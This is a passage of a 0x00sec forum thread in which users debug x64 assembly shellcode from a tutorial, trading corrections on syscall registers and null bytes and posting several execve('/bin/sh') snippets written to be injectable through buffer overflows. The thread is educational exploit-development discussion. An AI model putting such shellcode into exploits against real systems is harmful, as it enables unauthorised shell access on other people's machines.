<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T03:05:51Z" class="post-time">
May 11, 2016, 3:05am
</time>
<meta itemprop="dateModified" content="2016-05-11T03:05:51Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>There is no <code>S</code> in hexadecimal.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/AgentSniff"><span itemprop="name">AgentSniff</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T03:43:11Z" class="post-time">
May 11, 2016, 3:43am
</time>
<meta itemprop="dateModified" content="2016-05-11T03:43:11Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>it is a string, not an hexadecimal value</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T05:13:41Z" class="post-time">
May 11, 2016, 5:13am
</time>
<meta itemprop="dateModified" content="2016-05-11T05:13:41Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Right, my mistake.</p>
<p>Also just wanted to point out some slight errors:</p>
<pre><code class="lang-auto">XOR:
// these should be XORs, not ORs
1 OR 1 = 0    // &lt;- 1 OR 1 is 1
1 OR 0 = 1
0 OR 1 = 1
0 OR 0 = 0
</code></pre>
<p>and in the following line</p>
<pre><code class="lang-sql">A shellcode is in many ways similar to a normal program, except for the 
fact that it uses the RAM used by the program you are exploitating (so 
not his own).
</code></pre>
<p>RAM is used by all programs; it is the entirety of all memory. I think what you meant to say was that the shellcode shares the same <em>memory space</em> as the target program.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T05:28:35Z" class="post-time">
May 11, 2016, 5:28am
</time>
<meta itemprop="dateModified" content="2016-05-11T05:28:35Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote group-VIP" data-username="dtm" data-post="10" data-topic="289">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/dtm/40/6409_2.png" class="avatar"> dtm:</div>
<blockquote>
<p>RAM is used by all programs; it is the entirety of all memory. I think what you meant to say was that the shellcode shares the same memory space as the target program.</p>
</blockquote>
</aside>
<p>There are some unusual circumstances where that does not hold <a href="https://en.wikipedia.org/wiki/Execute_in_place" rel="nofollow noopener">XIP eXecute In Place</a>. But, this is not that common</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T07:03:30Z" class="post-time">
May 11, 2016, 7:03am
</time>
<meta itemprop="dateModified" content="2016-05-11T07:11:40Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hey thanks for your comment.<br>
Thanks for mentioning that link.<br>
It’s a common misstep for people.</p>
<p>Few things:<br>
Execve and write are different syscalls and require different arguments.<br>
Assigning rdx twice seems like a typo.<br>
(Shouldnt the first RDX be RDI?).</p>
<p>In 64 bit instead of using<br>
<code>EAX, EBX, ECX, EDX, ESI EDI</code><br>
With EAX being the syscall and EBX … EDI it’s arguments.</p>
<p>You use:<br>
<code>RAX. RDI, RSI, RDX, RCX, R8, R9</code><br>
With RAX once again for the syscall, in the USERSPACE.</p>
<p>And:<br>
<code>RAX, RDI, RSI, RDX, R10, R8, R9</code><br>
With RAX once again for the syscall, in the KERNELSPACE</p>
<p>Anyway, perhaps you could write a x64 ASM tutorial? Would be awesome, there aren’t many good ones online.</p>
<p><a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a><br>
Changed the XOR and the RAM stuff.</p>
<p><a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a></p>
<aside class="quote no-group" data-username="0x00pf" data-post="11" data-topic="289">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>There are some unusual circumstances where that does not hold XIP eXecute In Place. But, this is not that common</p>
</blockquote>
</aside>
<p>Woah, this is some insane stuff. Though I can imagine it could be hard to find the location?</p>
<p>unh0lys0da</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T18:35:23Z" class="post-time">
May 11, 2016, 6:35pm
</time>
<meta itemprop="dateModified" content="2016-05-11T18:35:23Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Not sure what do you mean my <em>find the location</em>. Anyhow I never had a chance to use it. It is for really constrained embedded system…</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T21:56:17Z" class="post-time">
May 11, 2016, 9:56pm
</time>
<meta itemprop="dateModified" content="2016-05-11T21:56:17Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Find the location of the inode(?) to start reading from</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/AgentSniff"><span itemprop="name">AgentSniff</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T22:57:06Z" class="post-time">
May 11, 2016, 10:57pm
</time>
<meta itemprop="dateModified" content="2016-05-11T23:08:49Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You are right about the typo with rdi and rdx.</p>
<p>My experience with Assembly is only with 8bits processors like atmega and PIC.</p>
<p>I just translate your code for x64, i hope to learn more with your next tutorials!</p>
<p>I was trying to open a shell calling from the stack like your example but it does not work</p>
<p>take a look:</p>
<pre><code>section .text

        global _start:

_start:

        push 'sh'
        push 'bin/'
        mov rax,59
        mov rdi,rsp
        mov rsi,0
        ;mov rdx,0
        syscall

        mov rax,60
        mov rdi,0
        syscall
</code></pre>
<p>in this order of push command, it will first push two null bytes then ‘h’ and ‘s’, followed by second push ‘/’ ‘n’ ‘i’ ‘b’ right?</p>
<p>the stack works like a FILO (first in last out) so it spits ‘b’ ‘i’ ‘n’ ‘/’ ‘s’ ‘h’ x0 x0 right?</p>
<p>shell_stack: file format elf64-x86-64</p>
<p>Disassembly of section .text:</p>
<pre><code>0000000000400080 &lt;_start&gt;:
  400080:    68 73 68 00 00            pushq  $0x6873
  400085:    68 62 69 6e 2f            pushq  $0x2f6e6962
  40008a:    b8 3b 00 00 00            mov    $0x3b,%eax
  40008f:    48 89 e7                  mov    %rsp,%rdi
  400092:    be 00 00 00 00            mov    $0x0,%esi
  400097:    0f 05                     syscall 
  400099:    b8 3c 00 00 00            mov    $0x3c,%eax
  40009e:    bf 00 00 00 00            mov    $0x0,%edi
  4000a3:    0f 05                     syscall</code></pre>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-12T04:38:55Z" class="post-time">
May 12, 2016, 4:38am
</time>
<meta itemprop="dateModified" content="2016-05-12T04:38:55Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>OK! I think that depends on the specific system. Usually, and specially for the first stage boot code, you usually have just one option (the address the processor starts running code), for even more <em>embedded</em> system you probably will need an specialised Link Script</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-12T06:32:21Z" class="post-time">
May 12, 2016, 6:32am
</time>
<meta itemprop="dateModified" content="2016-05-12T06:44:03Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<p>It won’t work for several reasons:</p>
<ul>
<li>There are nullbytes. (If you’d use this to overflow nullterminated string input).</li>
<li>It’s /bin/sh</li>
<li>/bin/sh also has to be null terminated (You need to push a null on the stack as well).</li>
</ul>
<p>Apart from that the code is right.</p>
<p>I think the following should work:</p>
<pre><code class="lang-auto">section .text
    global _start

_start:
    xor rax, rax
    push rax
    push '//sh'
    push '/bin'
    mov rdi, rsp
    mov rsi, rax
    mov rdx, rax
    xor rax, 59
    syscall
 
    
</code></pre>
<p>I haven’t tested it, but I think it’s somewhat like this.<br>
You could also try to load <code>/bin//sh</code> in a registry since we’re working with 64 bit ^^(64 bit, 8 bytes, 8 chars).<br>
It would be something like:</p>
<pre><code class="lang-auto">xor rax,rax
push rax
mov rsi, rax
mov rdx, rax
mov rbx, '/bin//sh'
push rbx
mov rdi, rsp
xor rax, 59
syscall
</code></pre>
<p>But I also haven’t tried this one.<br>
I’ll try them later.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_19" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/AgentSniff"><span itemprop="name">AgentSniff</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-12T16:10:12Z" class="post-time">
May 12, 2016, 4:10pm
</time>
<meta itemprop="dateModified" content="2016-05-12T16:10:12Z">
<span itemprop="position">19</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you for your reply</p>
<p>I’m quite new to Linux, and always forget to put the root ‘/’ when using absolute path</p>
<p>i tried your code, it does not work here, i saw in the disassembly that the result from xor rax,rax does not result on null.</p>
<p>could you check this?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-12T16:50:01Z" class="post-time">
May 12, 2016, 4:50pm
</time>
<meta itemprop="dateModified" content="2016-05-12T16:50:01Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p><span class="mention">@unh0lys0da</span>: Your second code works OK on my system. The first one crashes… I haven’t checked why . I like the <code>xor rax,59</code></p>
<p>This is my version (<span class="mention">@unh0lys0da</span> a small variation of the one you’ve already seen).</p>
<pre><code class="lang-auto">section .text
	msg db '/bin/sh',0 
	
	global _start   
 
_start:
	xor rax,rax
	mov rdx,rax 		; No Env
	mov rsi,rax		; No argv
	lea rdi, [rel msg]

	add al, 0x3b

	syscall	
</code></pre>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_21" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-12T18:08:28Z" class="post-time">
May 12, 2016, 6:08pm
</time>
<meta itemprop="dateModified" content="2016-05-12T18:08:28Z">
<span itemprop="position">21</span>
</span>
</div>
<div class="post" itemprop="text">
<p>xor whatever, whatever<br>
Should ALWAYS result in 0.<br>
for each bit it is either 1 or 0<br>
1 XOR 1 = 0<br>
0 XOR 0 = 0</p>
<p>There is no way that RAX != RAX<br>
Every bit in RAX == The same bit in RAX</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><b><a rel="next" itemprop="url" href="289%3Fpage=2.html">next page →</a></b></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
